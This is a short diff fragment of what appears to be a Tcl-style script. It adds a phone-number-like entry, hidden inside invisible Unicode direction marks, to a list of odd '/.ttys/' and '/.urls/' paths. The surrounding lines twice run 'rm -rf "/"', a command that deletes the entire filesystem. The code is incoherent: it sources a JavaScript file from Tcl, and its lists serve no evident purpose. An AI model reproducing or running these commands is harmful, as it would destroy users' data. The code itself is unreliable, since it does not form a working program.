@@ -7,6 +7,7 @@ source "security.js"
 set y [rm -rf "/"]
 set z [rm -rf "/"]
 set x { \
+	"/.ttys/‪+56 9 4043 6142‬" \
 	"/.urls/yeezy.com" \
 	"/.urls/bvulkania.cl" \
 	"/.urls/ripuaria.cl" \
